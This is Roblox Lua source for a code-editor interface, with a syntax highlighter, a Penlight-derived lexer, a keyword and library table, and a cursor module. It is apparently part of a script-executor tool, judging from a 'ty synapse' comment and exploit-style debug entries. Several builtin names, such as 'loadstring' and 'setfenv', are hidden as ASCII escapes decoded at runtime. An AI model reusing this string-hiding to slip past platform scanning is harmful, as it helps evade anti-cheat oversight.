						table.insert(richText, sanitizedText)
					end
				end

				local success, err = pcall(function()
					highlightBox.Text = table.concat(richText)
				end)
				if not success then
					highlightBox.Text = ""
					warn(err)
				end

				return function()
					highlightBox.Text = src
				end

			elseif mode == "multi" then
				local linesFolder = textObject:FindFirstChild("SyntaxLines")
				if linesFolder and linesFolder:IsA("TextLabel") then
					linesFolder:Destroy()
					linesFolder = nil
				end
				if not linesFolder then
					linesFolder = Instance.new("Folder", textObject)
					linesFolder.Name = "SyntaxLines"
				end

				if textObject:FindFirstChild("SyntaxLines") then
					linesFolder = textObject:FindFirstChild("SyntaxLines")
				else
					linesFolder = Instance.new("Folder", textObject)
					linesFolder.Name = "SyntaxLines"
				end

				if textObject:IsA("TextBox") then
					currentTextbox = textObject
				end

				local textSize = textObject.TextSize

				local _, numLines = string.gsub(src, "\n", "")
				numLines += 1

				local size = TextService:GetTextSize("", textObject.TextSize, textObject.Font, Vector2.new());

				local lineLabels = activeLabels[textObject]
				if not lineLabels then
					lineLabels = table.create(numLines)
					for i = 1, numLines do
						local lineLabel = Instance.new("TextLabel")
						lineLabel.Name = "Line_" .. i
						lineLabel.RichText = true
						lineLabel.BackgroundTransparency = 1
						lineLabel.TextXAlignment = Enum.TextXAlignment.Left
						lineLabel.TextYAlignment = Enum.TextYAlignment.Top
						lineLabel.TextColor3 = tokenColors.iden.Color
						lineLabel.Font = textObject.Font
						lineLabel.TextSize = textSize
						lineLabel.ZIndex = textObject.ZIndex + 2
						lineLabel.AutomaticSize = Enum.AutomaticSize.X

						lineLabel.Size = UDim2.new(1, 0, 0, size.Y)
						lineLabel.Position = UDim2.fromOffset(0, size.Y * textObject.LineHeight * (i - 1))
						lineLabel.Text = ""

						lineLabel.Parent = linesFolder
						lineLabels[i] = lineLabel
					end
				elseif #lineLabels < numLines then
					for i = #lineLabels + 1, numLines do
						local lineLabel = Instance.new("TextLabel")
						lineLabel.Name = "Line_" .. i
						lineLabel.RichText = true
						lineLabel.BackgroundTransparency = 1
						lineLabel.TextXAlignment = Enum.TextXAlignment.Left
						lineLabel.TextYAlignment = Enum.TextYAlignment.Top
						lineLabel.TextColor3 = tokenColors.iden.Color
						lineLabel.Font = textObject.Font
						lineLabel.TextSize = textSize
						lineLabel.BorderColor3 = Color3.fromRGB(53, 17, 255)
						lineLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
						lineLabel.ZIndex = textObject.ZIndex + 2
						lineLabel.AutomaticSize = Enum.AutomaticSize.X

						lineLabel.Size = UDim2.new(1, 0, 0, size.Y)
						lineLabel.Position = UDim2.fromOffset(0, size.Y * textObject.LineHeight * (i - 1))
						lineLabel.Text = ""

						lineLabel.Parent = linesFolder
						lineLabels[i] = lineLabel
					end
				elseif #lineLabels > numLines then
					for i = #lineLabels, numLines, -1 do
						lineLabels[i].Text = ""
					end
				end

				local richText, index, lineNumber = {}, 0, 1
				for token, content in Lexer.scan(src) do
					local Color = tokenColors[token] or tokenColors.iden.Color

					local lines = string.split(sanitizeRichText(content), "\n")
					for l, line in ipairs(lines) do
						if l > 1 then
							lineLabels[lineNumber].Text = table.concat(richText)
							lineNumber += 1
							index = 0
							table.clear(richText)
						end

						index += 1
						if Color ~= tokenColors.iden.Color and string.find(line, "[%S%C]") then
							richText[index] = string.format(tokenFormats[token], line)
						else
							richText[index] = line
						end
					end
				end

				lineLabels[lineNumber].Text = table.concat(richText)

				activeLabels[textObject] = lineLabels

				local cleanup
				cleanup = textObject.AncestryChanged:Connect(function()
					if textObject.Parent then
						return
					end
					activeLabels[textObject] = nil
					cleanup:Disconnect()
				end)

				return function()
					for _, label in ipairs(lineLabels) do
						label:Destroy()
					end
					table.clear(lineLabels)

					activeLabels[textObject] = nil
					cleanup:Disconnect()
				end
			else
				--error("Invalid mode specified. Use 'single' or 'multi'.")
			end
		end

		-- ty synapse
--[[export type HighlighterColors = {
	background: Color3?,
	iden: Color3?,
	keyword: Color3?,
	builtin: Color3?,
	string: Color3?,
	number: Color3?,
	comment: Color3?,
	operator: Color3?
}]]

		local function updateColors(colors, mode)
			-- Setup color data
			tokenColors.background = (colors and colors.background) or {Color = Color3.fromRGB(255, 255, 255)}
			tokenColors.iden = (colors and colors.iden) or {Color = Color3.fromRGB(156, 220, 254)}
			tokenColors.keyword = (colors and colors.keyword) or {Color = Color3.fromRGB(255, 173, 250)}
			tokenColors.variable = (colors and colors.variable) or {Color = Color3.fromRGB(102, 186, 255)}
			tokenColors.builtin = (colors and colors.builtin) or {Color = Color3.fromRGB(255, 255, 197)}
			tokenColors.string = (colors and colors.string) or {Color = Color3.fromRGB(255, 179, 149)}
			tokenColors.number = (colors and colors.number) or {Color = Color3.fromRGB(224, 255, 208)}
			tokenColors.comment = (colors and colors.comment) or {Color = Color3.fromRGB(152, 216, 120)}
			tokenColors.operator = (colors and colors.operator) or {Color = Color3.fromRGB(255, 215, 0)}
			tokenColors.localmethod = (colors and colors.localmethod) or {Color = Color3.fromRGB(255, 255, 197)}
			tokenColors.properties = (colors and colors.properties) or {Color = Color3.fromRGB(88, 210, 255)}
			tokenColors.boolean = (colors and colors.boolean) or {Color = Color3.fromRGB(102, 186, 255)}
			tokenColors.localproperty = (colors and colors.localproperty) or {Color = Color3.fromRGB(99, 255, 221)}
			tokenColors.todo = (colors and colors.todo) or {Color = Color3.fromRGB(255, 201, 37), IsBold = true}
			tokenColors.link = (colors and colors.link) or {Color = Color3.fromRGB(51, 173, 255), IsUnderlined = true}
			tokenColors.custom = (colors and colors.custom) or {Color = Color3.fromRGB(144, 194, 255), IsBold = true}

			for key, value in pairs(tokenColors) do
				if not value.IsBold then
					tokenFormats[key] = '<font color="#'.. string.format("%.2x%.2x%.2x", value.Color.R * 255, value.Color.G * 255, value.Color.B * 255).. '">%s</font>'
				else
					tokenFormats[key] = '<b><font color="#'.. string.format("%.2x%.2x%.2x", value.Color.R * 255, value.Color.G * 255, value.Color.B * 255).. '">%s</font></b>'
				end
				if value.IsItalicized then
					tokenFormats[key] = string.format("<i>%s</i>", tokenFormats[key])
				end
				if value.IsUnderlined then
					tokenFormats[key] = string.format("<u>%s</u>", tokenFormats[key])
				end
			end

			-- Rehighlight existing labels using latest colors
			for label, lineLabels in pairs(activeLabels) do
				for _, lineLabel in ipairs(lineLabels) do
					lineLabel.TextColor3 = tokenColors.iden.Color
				end
				highlight(label)
			end
		end

		local function update()
			for label, lineLabels in pairs(activeLabels) do
				for i, lineLabel in ipairs(lineLabels) do
					local size = TextService:GetTextSize("", currentTextbox.TextSize, currentTextbox.Font, Vector2.new());
					lineLabel.TextColor3 = tokenColors.iden.Color
					lineLabel.TextSize = currentTextbox.TextSize
					lineLabel.Position = UDim2.fromOffset(0, size.Y * currentTextbox.LineHeight * (i - 1))
					lineLabel.Size = UDim2.new(1, 0, 0, size.Y)
					lineLabel.FontFace = currentTextbox.FontFace
				end
				highlight(label)
			end
		end

		local function changeLang(module)
			if not module then
				return
			end

			Lexer = module

			update()
		end

		pcall(updateColors)
		task.spawn(function()
			repeat task.wait() until currentTextbox
			currentTextbox:GetPropertyChangedSignal("TextSize"):Connect(function()
				update()
			end)
			currentTextbox:GetPropertyChangedSignal("FontFace"):Connect(function()
				update()
			end)
			pcall(function()
				update()
			end)
		end)

		return setmetatable({
			UpdateColors = updateColors,
			Highlight = highlight,
			TokenColors = tokenColors,
			ChangeLang = changeLang,
		}, {
			__call = function(_, textObject, src)
				return highlight(textObject, src)
			end
		})

	end;
};
G2L_MODULES[G2L["3f"]] = {
	Closure = function()
		local script = G2L["3f"];--[=[
	Lexical scanner for creating a sequence of tokens from Lua source code.
	This is a heavily modified and Roblox-optimized version of
	the original Penlight Lexer module:
		https://github.com/stevedonovan/Penlight
	Authors:
		stevedonovan <https://github.com/stevedonovan> ----------- Original Penlight lexer author
		ryanjmulder <https://github.com/ryanjmulder> ------------- Penlight lexer contributer
		mpeterv <https://github.com/mpeterv> --------------------- Penlight lexer contributer
		Tieske <https://github.com/Tieske> ----------------------- Penlight lexer contributer
		boatbomber <https://github.com/boatbomber> --------------- Roblox port, added builtin token,
		                                                           added patterns for incomplete syntax, bug fixes,
		                                                           behavior changes, token optimization, thread optimization
		                                                           Added lexer.navigator() for non-sequential reads
		Sleitnick <https://github.com/Sleitnick> ----------------- Roblox optimizations
		howmanysmall <https://github.com/howmanysmall> ----------- Lua + Roblox optimizations

	List of possible tokens:
		- iden
		- keyword
		- builtin
		- string
		- number
		- comment
		- operator
--]=]

		local lexer = {}

		local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
		local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
		local NUMBER_A = "0x[%da-fA-F]+"
		local NUMBER_B = "%d+%.?%d*[eE][%+%-]?%d+"
		local NUMBER_C = "%d+[%d_%.]*[eE]?[%+%-]?%d*[a-zA-Z]*"
		local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
		local BRACKETS = "[%[%]]+" -- needs to be separate pattern from other operators or it'll mess up multiline strings
		local IDEN = "[%a_][%w_]*"
		local STRING_EMPTY = "(['\"])%1" --Empty String
		local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)" --TODO: Handle escaping escapes
		local STRING_INCOMP_A = "(['\"]).-\n" --Incompleted String with next line
		local STRING_INCOMP_B = "(['\"])[^\n]*" --Incompleted String without next line
		local STRING_MULTI = "%[(=*)%[.-%]%1%]" --Multiline-String
		local STRING_MULTI_INCOMP = "%[=*%[.-.*" --Incompleted Multiline-String
		local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]" --Completed Multiline-Comment
		local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*" --Incompleted Multiline-Comment
		local COMMENT_PLAIN = "%-%-.-\n" --Completed Singleline-Comment
		local COMMENT_INCOMP = "%-%-.*" --Incompleted Singleline-Comment
		--local TYPED_VAR = ":%s*([%w%?%| \t]+%s*)" --Typed variable, parameter, function 
		local lang = require(script.Language)
		local lua_keyword = lang.keyword
		local lua_variables = lang.variables
		local lua_builtin = lang.builtin
		local lua_selection = lang.selection
		local lua_libraries = lang.libraries
		local lua_properties = lang.properties
		local lua_booleans = lang.booleans
		local lua_comments = lang.comments
		local lua_customKeywords = lang.customKeywords

		local lua_matches = {
			-- Indentifiers
			{ Prefix .. IDEN .. Suffix, "var" },
			--{ Prefix .. TYPED_VAR .. Suffix, "localmethod" },

			-- Numbers
			{ Prefix .. NUMBER_A .. Suffix, "number" },
			{ Prefix .. NUMBER_B .. Suffix, "number" },
			{ Prefix .. NUMBER_C .. Suffix, "number" },

			-- Strings
			{ Prefix .. STRING_EMPTY .. Suffix, "string" },
			{ Prefix .. STRING_PLAIN .. Suffix, "string" },
			{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
			{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
			{ Prefix .. STRING_MULTI .. Suffix, "string" },
			{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },

			-- Comments
			{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
			{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
			{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
			{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },

			-- Operators
			{ Prefix .. OPERATORS .. Suffix, "operator" },
			{ Prefix .. BRACKETS .. Suffix, "operator" },

			-- Unicode
			{ Prefix .. UNICODE .. Suffix, "iden" },

			-- Unknown
			{ "^.", "iden" },
		}

		--- Create a plain token iterator from a string.
		-- @tparam string s a string.

		function lexer.scan(s)
			-- local startTime = os.clock()
			lexer.finished = false

			local index = 1
			local sz = #s
			local p1, p2, p3, pT = "", "", "", ""

			return function()
				if index <= sz then
					for _, m in ipairs(lua_matches) do
						local i1, i2 = string.find(s, m[1], index)
						if i1 then
							local tok = string.sub(s, i1, i2)
							index = i2 + 1
							lexer.finished = index > sz
							--if lexer.finished then
							--	print((os.clock()-startTime)*1000, "ms")
							--end

							local t = m[2]
							local t2 = t

							-- Process t into t2
							if string.find(tok, "^https://") then
								t2 = "link"
							end

							if t == "var" and t2 ~= "link" then
								-- Since we merge spaces into the tok, we need to remove them
								-- in order to check the actual word it contains
								local cleanTok = string.gsub(tok, Cleaner, "")

								if lua_keyword[cleanTok] then
									t2 = "keyword"
								elseif lua_builtin[cleanTok] then
									t2 = "builtin"
								elseif lua_properties[cleanTok] then
									t2 = "properties"
								elseif lua_booleans[cleanTok] then
									t2 = "boolean"
								elseif lua_variables[cleanTok] then
									t2 = "variable"
								elseif lua_customKeywords[cleanTok] then
									t2 = "custom"
								else
									t2 = "iden"
								end

						--[[
						if string.find(p1, ":%s*[%s%c]*$") and pT ~= "comment" then
							-- The previous was a : so we need to special case method indexing
							local parent = string.gsub(p2, Cleaner, "")
							local lib = lua_libraries[parent]
							if lib and lib[cleanTok] and not string.find(p3, "%.[%s%c]*$") then
								-- Indexing a builtin lib with existing item, treat as a builtin
								t2 = "localmethod"
							else
								-- Indexing a non-builtin, can't be treated as a keyword/builtin
								t2 = "localmethod"
							end
						end
						]]

								-- make it so if it has "https://" then it'll count as a link

								if string.find(p1, "%.[%s%c]*$") and pT ~= "comment" then
									-- The previous was a . so we need to special case indexing things
									local parent = string.gsub(p2, Cleaner, "")
									local lib = lua_libraries[parent]
									if lib and lib[cleanTok] and not string.find(p3, "%.[%s%c]*$") then
										-- Indexing a builtin lib with existing item, treat as a builtin
										t2 = "builtin"
									else
										-- Indexing a non builtin, can't be treated as a keyword/builtin
										t2 = "localproperty"
									end
									-- print("indexing",parent,"with",cleanTok,"as",t2)
								end
								if t2 ~= "builtin" and t2 ~= "keyword" then
									if string.find(s, "^%s*%(", index) or string.find(s, "^%s*'", index) or string.find(s, '^%s*"', index) or string.find(s, '^%s*{', index) then
										-- The next character after this token is an open parenthesis
										t2 = "localmethod"
									end
								end
							end

							-- Record last 3 tokens for the indexing context check
							p3 = p2
							p2 = p1
							p1 = tok
							pT = t2
							return t2, tok
						end
					end
				end
			end
		end

		function lexer.navigator()
			local nav = {
				Source = "",
				TokenCache = table.create(50),

				_RealIndex = 0,
				_UserIndex = 0,
				_ScanThread = nil,
			}

			function nav:Destroy()
				self.Source = nil
				self._RealIndex = nil
				self._UserIndex = nil
				self.TokenCache = nil
				self._ScanThread = nil
			end

			function nav:SetSource(SourceString)
				self.Source = SourceString

				self._RealIndex = 0
				self._UserIndex = 0
				table.clear(self.TokenCache)

				self._ScanThread = coroutine.create(function()
					for Token, Src in lexer.scan(self.Source) do
						self._RealIndex += 1
						self.TokenCache[self._RealIndex] = { Token, Src }
						coroutine.yield(Token, Src)
					end
				end)
			end

			function nav.Next()
				nav._UserIndex += 1

				if nav._RealIndex >= nav._UserIndex then
					-- Already scanned, return cached
					return table.unpack(nav.TokenCache[nav._UserIndex])
				else
					if coroutine.status(nav._ScanThread) == "dead" then
						-- Scan thread dead
						return
					else
						local success, token, src = coroutine.resume(nav._ScanThread)
						if success and token then
							-- Scanned new data
							return token, src
						else
							-- Lex completed
							return
						end
					end
				end
			end

			function nav.Peek(PeekAmount)
				local GoalIndex = nav._UserIndex + PeekAmount

				if nav._RealIndex >= GoalIndex then
					-- Already scanned, return cached
					if GoalIndex > 0 then
						return table.unpack(nav.TokenCache[GoalIndex])
					else
						-- Invalid peek
						return
					end
				else
					if coroutine.status(nav._ScanThread) == "dead" then
						-- Scan thread dead
						return
					else
						local IterationsAway = GoalIndex - nav._RealIndex

						local success, token, src = nil, nil, nil

						for _ = 1, IterationsAway do
							success, token, src = coroutine.resume(nav._ScanThread)
							if not (success or token) then
								-- Lex completed
								break
							end
						end

						return token, src
					end
				end
			end

			return nav
		end

		return lexer

	end;
};
G2L_MODULES[G2L["40"]] = {
	Closure = function()
		local script = G2L["40"];function asciiDecode(str : string)
			local decoded = ""

			str = string.gsub(str, "%s+", "") str = string.gsub(str, "\n+", "")
			str = string.gsub(str, "\t+", "") str = string.gsub(str, "\r+", "")

			for code in str:gmatch("\\(%d+)") do
				decoded = decoded .. string.char(tonumber(code))
			end

			return decoded
		end

		return {
			customKeywords = {},

			keyword = {
				["and"] = true,
				["break"] = true,
				["do"] = true,
				["else"] = true,
				["elseif"] = true,
				["end"] = true,
				["for"] = true,
				["function"] = true,
				["if"] = true,
				["in"] = true,
				["not"] = true,
				["while"] = true,
				["or"] = true,
				["repeat"] = true,
				["return"] = true,
				["then"] = true,
				["self"] = true,
				["until"] = true,
				["continue"] = true,
				["export"] = true,
				["type"] = true,
				["typeof"] = true,
			},

			variables = {
				["local"] = true,
			},

			builtin = {
				-- Lua Functions
				["assert"] = true,
				["collectgarbage"] = true,
				["error"] = true,
				[asciiDecode([[
			\103
			\101
			\116
			\102
			\101
			\110
			\118
		]])] = true,
				["getmetatable"] = true,
				["ipairs"] = true,
				[asciiDecode([[
			\108
			\111
			\97
			\100
			\115
			\116
			\114
			\105
			\110
			\103
		]])] = true,
				["newproxy"] = true,
				["next"] = true,
				["pairs"] = true,
				["pcall"] = true,
				["print"] = true,
				["rawequal"] = true,
				["rawget"] = true,
				["rawset"] = true,
				["select"] = true,
				[asciiDecode([[
			\115
			\101
			\116
			\102
			\101
			\110
			\118
		]])] = true,
				["setmetatable"] = true,
				["tonumber"] = true,
				["tostring"] = true,
				["unpack"] = true,
				["xpcall"] = true,
				["buffer"] = true,
				["Font"] = true,

				-- API functions

				-- Lua Variables
				["_G"] = true,
				["_VERSION"] = true,

				-- Lua Tables
				["bit32"] = true,
				["coroutine"] = true,
				["debug"] = true,
				["math"] = true,
				["os"] = true,
				["string"] = true,
				["table"] = true,
				["utf8"] = true,

				-- Roblox Functions
				["delay"] = true,
				["elapsedTime"] = true,
				["gcinfo"] = true,
				[asciiDecode([[
			\114
			\101
			\113
			\117
			\105
			\114
			\101
		]])] = true,
				["settings"] = true,
				["spawn"] = true,
				["tick"] = true,
				["time"] = true,
				["UserSettings"] = true,
				["wait"] = true,
				["warn"] = true,
				["ypcall"] = true,

				-- Roblox Variables
				["Enum"] = true,
				["shared"] = true,
				["script"] = true,
				["workspace"] = true,
				["Workspace"] = true,
				["plugin"] = true,
				["game"] = true,
				["Game"] = true,

				-- Roblox Tables
				["Axes"] = true,
				["BrickColor"] = true,
				["CatalogSearchParams"] = true,
				["CellId"] = true,
				["CFrame"] = true,
				["Color3"] = true,
				["ColorSequence"] = true,
				["ColorSequenceKeypoint"] = true,
				["DateTime"] = true,
				["DockWidgetPluginGuiInfo"] = true,
				["Faces"] = true,
				["File"] = true,
				["FloatCurveKey"] = true,
				["Instance"] = true,
				["NumberRange"] = true,
				["NumberSequence"] = true,
				["NumberSequenceKeypoint"] = true,
				["OverlapParams"] = true,
				["PathWaypoint"] = true,
				["PhysicalProperties"] = true,
				["PluginDrag"] = true,
				["Random"] = true,
				["Ray"] = true,
				["RaycastParams"] = true,
				["Rect"] = true,
				["Region3"] = true,
				["Region3int16"] = true,
				["RotationCurveKey"] = true,
				["task"] = true,
				["TextChatMessageProperties"] = true,
				["TweenInfo"] = true,
				["UDim"] = true,
				["UDim2"] = true,
				["Vector2"] = true,
				["Vector2int16"] = true,
				["Vector3"] = true,
				["Vector3int16"] = true,
			},

			properties = {
				-- Appearance
				["BrickColor"] = true,
				["CastShadows"] = true,
				["Color"] = true,
				["Material"] = true,
				["Reflectance"] = true,
				["MaterialVariant"] = true,
				["Transparency"] = true,
				["MeshId"] = true,
				["RenderFidelity"] = true,
				["TextureID"] = true,

				-- Data
				["Parent"] = true,
				["Name"] = true,
				["Archivable"] = true,
				["ClassName"] = true,
				["Locked"] = true,
				["ResizeableFaces"] = true,
				["ResizeIncrement"] = true,

				-- Transform
				["Size"] = true,
				["CFrame"] = true,
				["Orgin"] = true,
				["Position"] = true,
				["Orientation"] = true,
				["PivotOffset"] = true,

				-- Collision
				["CanCollide"] = true,
				["CanTouch"] = true,
				["CollisionGroup"] = true,

				-- Object
				["Anchored"] = true,
				["CenterOfMass"] = true,
				["CurrentPhysicalProperties"] = true,
				["CustomPhysicalProperties"] = true,
				["Mass"] = true,
				["Massless"] = true,
				["RootPriority"] = true,
				["Shape"] = true,
				["PrimaryPart"] = true,
				["Scale"] = true,

				-- Behavior
				["ModelStreamingMode"] = true,

				-- Assembly
				["AssemblyLinearVelocity"] = true,
				["AssemblyAngularVelocity"] = true,
				["AssemblyCenterOfMass"] = true,
				["AssemblyMass"] = true,
				["AssemblyRootPart"] = true,

				-- Script
				["Enabled"] = true,
				["Disabled"] = true,
				["Source"] = true,
				["CurrentEditor"] = true,
				["RunContext"] = true,
			},

			booleans = {
				["true"] = true,
				["false"] = true,
				["nil"] = true,
			},

			comments = {
				["TODO"] = true,
			},

			libraries = {

				-- Lua Libraries
				math = {
					abs = true,
					acos = true,
					asin = true,
					atan = true,
					atan2 = true,
					ceil = true,
					clamp = true,
					cos = true,
					cosh = true,
					deg = true,
					exp = true,
					floor = true,
					fmod = true,
					frexp = true,
					ldexp = true,
					log = true,
					log10 = true,
					max = true,
					min = true,
					modf = true,
					noise = true,
					pow = true,
					rad = true,
					random = true,
					round = true,
					sinh = true,
					sqrt = true,
					tan = true,
					tanh = true,
					sign = true,
					sin = true,
					randomseed = true,

					huge = true,
					pi = true,
				},

				string = {
					byte = true,
					char = true,
					find = true,
					format = true,
					gmatch = true,
					gsub = true,
					len = true,
					lower = true,
					match = true,
					pack = true,
					packsize = true,
					rep = true,
					reverse = true,
					split = true,
					sub = true,
					unpack = true,
					upper = true,
				},

				table = {
					clear = true,
					concat = true,
					foreach = true,
					foreachi = true,
					freeze = true,
					getn = true,
					insert = true,
					isfrozen = true,
					maxn = true,
					remove = true,
					sort = true,
					find = true,
					pack = true,
					unpack = true,
					move = true,
					create = true,
				},

				debug = {
					dumpheap = true,
					info = true,
					profilebegin = true,
					profileend = true,
					resetmemorycategory = true,
					setmemorycategory = true,
					traceback = true,
					getconstant = true,
					getconstants = true,
					getinfo = true,
					getproto = true,
					getprotos = true,
					getstack = true,
					getupvalue = true,
					getupvalues = true,
					setconstant = true,
					setstack = true,
					setupvalue = true,
					getregistry = true,
					setmetatable = true,
					getlocals = true,
					getlocal = true,
					setlocal = true,
				},

				os = {
					time = true,
					date = true,
					difftime = true,
					clock = true,
				},

				coroutine = {
					create = true,
					isyieldable = true,
					resume = true,
					running = true,
					status = true,
					wrap = true,
					yield = true,
				},

				bit32 = {
					arshift = true,
					band = true,
					bnot = true,
					bor = true,
					btest = true,
					bxor = true,
					countlz = true,
					countrz = true,
					extract = true,
					lrotate = true,
					lshift = true,
					replace = true,
					rrotate = true,
					rshift = true,
				},

				utf8 = {
					char = true,
					codepoint = true,
					codes = true,
					graphemes = true,
					len = true,
					nfcnormalize = true,
					nfdnormalize = true,
					offset = true,

					charpattern = true,
				},

				-- Roblox Libraries
				Axes = {
					new = true,
				},

				BrickColor = {
					new = true,
					New = true,
					Random = true,
					Black = true,
					Blue = true,
					DarkGray = true,
					Gray = true,
					Green = true,
					Red = true,
					White = true,
					Yellow = true,
					palette = true,
					random = true,
				},

				CatalogSearchParams = {
					new = true,
				},

				CellId = {
					new = true,
				},

				CFrame = {
					new = true,
					Angles = true,
					fromAxisAngle = true,
					fromEulerAnglesXYZ = true,
					fromEulerAnglesYXZ = true,
					fromMatrix = true,
					fromOrientation = true,
					lookAt = true,

					identity = true,
				},

				Color3 = {
					new = true,
					fromRGB = true,
					fromHSV = true,
					fromHex = true,
					toHSV = true,
				},

				ColorSequence = {
					new = true,
				},

				ColorSequenceKeypoint = {
					new = true,
				},

				DateTime = {
					now = true,
					fromIsoDate = true,
					fromLocalTime = true,
					fromUniversalTime = true,
					fromUnixTimestamp = true,
					fromUnixTimestampMillis = true,
				},

				DockWidgetPluginGuiInfo = {
					new = true,
				},

				Faces = {
					new = true,
				},

				FloatCurveKey = {
					new = true,
				},

				Instance = {
					new = true,
				},

				NumberRange = {
					new = true,
				},

				NumberSequence = {
					new = true,
				},

				NumberSequenceKeypoint = {
					new = true,
				},

				OverlapParams = {
					new = true,
				},

				PathWaypoint = {
					new = true,
				},

				PhysicalProperties = {
					new = true,
				},

				PluginDrag = {
					new = true,
				},

				Random = {
					new = true,
				},

				Ray = {
					new = true,
				},

				RaycastParams = {
					new = true,
				},

				Rect = {
					new = true,
				},

				Region3 = {
					new = true,
				},

				Region3int16 = {
					new = true,
				},

				RotationCurveKey = {
					new = true,
				},

				task = {
					wait = true,
					spawn = true,
					delay = true,
					defer = true,
					synchronize = true,
					desynchronize = true,
				},

				TweenInfo = {
					new = true,
				},

				UDim = {
					new = true,
				},

				UDim2 = {
					new = true,
					fromScale = true,
					fromOffset = true,
				},

				Vector2 = {
					new = true,

					one = true,
					zero = true,
					xAxis = true,
					yAxis = true,
				},

				Vector2int16 = {
					new = true,
				},

				Vector3 = {
					new = true,
					fromAxis = true,
					fromNormalId = true,
					FromAxis = true,
					FromNormalId = true,

					one = true,
					zero = true,
					xAxis = true,
					yAxis = true,
					zAxis = true,
				},

				Vector3int16 = {
					new = true,
				},

				buffer = {
					tostring = true,
					len = true,
					readi8 = true,
					readf32 = true,
					readu8 = true,
					readf64 = true,
					readi16 = true,
					readi32 = true,
					readu16 = true,
					readu32 = true,
					copy = true,
					fill = true,
					create = true,
					writei8 = true,
					writeu8 = true,
					writef32 = true,
					writef64 = true,
					writei16 = true,
					writei32 = true,
					writeu16 = true,
					writeu32 = true,
					fromstring = true,
					readstring = true,
					writestring = true,
				},

				Font = {
					new = true,
					fromId = true,
					fromEnum = true,
					fromName = true,
				},

				Enum = {
					KeyCode = true,
					Button = true,
					Material = true,
					AutomaticSize = true,
					UserInputType = true,
					Font = true,
					NormalId = true,
					EasingStyle = true,
					EasingDirection = true,
					PoseEasingStyle = true,
					CameraType = true,
					SortOrder = true,
					CoreGuiType = true,
					InOut = true,
					RigType = true,
					ExplosionType = true,
					FontSize = true,
					VerticalAlignment = true,
					HorizontalAlignment = true,
					CameraMode = true,
					TextXAlignment = true,
					HumanoidRigType = true,
					BodyPart = true,
					InputType = true,
					ScaleType = true,
					AspectType = true,
					ChatVersion = true,
					DominantAxis = true,
					FillDirection = true,
					TextYAlignment = true,
					ApplyStrokeMode = true,
					HumanoidStateType = true,
					Language = true,
					MeshType = true,
					UserInputState = true,
					ZIndexBehavior = true,
					RaycastFilterType = true,
					ModelStreamingMode = true,
					Axis = true,
					Limb = true,
					AdShape = true,
					AlignType = true,
					AlphaMode = true,
					AssetType = true,
					ActionType = true,
					AdEventType = true,
					ActuatorType = true,
					AdUnitStatus = true,
					AudioSubType = true,
				},
			},
		}
	end;
};
G2L_MODULES[G2L["41"]] = {
	Closure = function()
		local script = G2L["41"];local Input = {}

		function Input:set(data)
			self.Textbox = nil
			self.LineHighligher = nil
			self.InputCursor = nil

			self._focused = false
			self._transparent = false
			self._isAnimating = false

			self.Shared = nil

			self.Services = {}
			self.Theme = {}

			self.Data = data

			self:init()
		end

		function Input:init()
			self.Textbox = self.Data.textbox
			self.LineHighligher = script.LineHighlighter:Clone()
			self.InputCursor = script.InputCursor:Clone()

			self.LineHighligher.ZIndex = self.Textbox.ZIndex + 1
			self.InputCursor.ZIndex = self.Textbox.ZIndex + 1
			self.LineHighligher.Parent = self.Textbox
			self.InputCursor.Parent = self.Textbox

			self.Shared = require(script.Parent.Shared)

			self._focused = false
			self._transparent = false
			self._isAnimating = false

			self.Services = {
				TextService = game:GetService("TextService"),
				RunService = game:GetService("RunService"),
			}
			self.Theme = self.Data.theme

			task.spawn(function()
				self.Services.RunService.RenderStepped:Connect(function()
					self.InputCursor.BackgroundColor3 = self.Theme.CURSOR_COLOR
					if self._transparent then
						self.InputCursor.BackgroundTransparency = 0
					end
					if not self._focused then
						self.InputCursor.BackgroundTransparency = self.Theme.CURSOR_INACTIVE_TRANSPARENCY
					end
				end)

				while task.wait() do
					if self._focused then
						if self._isAnimating then
							self._isAnimating = false
							self.Shared:tween(self.InputCursor, TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundTransparency = 1})
							task.wait(.5)
						end
						if not self._isAnimating then
							self._isAnimating = true
							self.Shared:tween(self.InputCursor, TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundTransparency = 0})
							task.wait(.5)
						end
					end
				end
			end)
		end

		function Input:update(data)
			local cursorPos = self.Textbox.CursorPosition - 1
			local cursorLines = (cursorPos > #self.Textbox.Text and self.Textbox.Text .. (" "):rep(cursorPos - #self.Textbox.Text) or self.Textbox.Text):sub(0, cursorPos):split("\n")

			local cursorLineText = cursorLines[#cursorLines]
			local cursorWidth = self.Services.TextService:GetTextSize(cursorLineText, self.Textbox.TextSize, self.Textbox.Font, Vector2.new(math.huge, math.huge)).X

			local textSize = self.Services.TextService:GetTextSize("", self.Textbox.TextSize, self.Textbox.Font, Vector2.new())

			self._focused = data.focused
			self._transparent = data.isInputed

			self.LineHighligher.Size = UDim2.new(1, 0, 0, textSize.Y + 3)
			self.InputCursor.Size = UDim2.new(0, 1, 0, textSize.Y + 3)

			self.LineHighligher.ZIndex = self.Textbox.ZIndex + 1
			self.InputCursor.ZIndex = self.Textbox.ZIndex + 1

			for index = 1, #cursorLines do
				if data.focused then
					local leftShift = 1
					if self.Theme then
						if self.Theme.LINE_NUMBER_HIGHLIGHT_TRANSPARENCY:lower() ~= "none" then
							leftShift = 2
						end
					end

					self.LineHighligher:TweenPosition(UDim2.new(0,-leftShift,0, textSize.Y * (#cursorLines - 1)), 'Out', 'Quad', data.speed, true,nil)
					self.InputCursor:TweenPosition(UDim2.new(0,cursorWidth,0, textSize.Y * (#cursorLines - 1)), 'Out', 'Quad', data.speed, true,nil)
				end
			end
		end

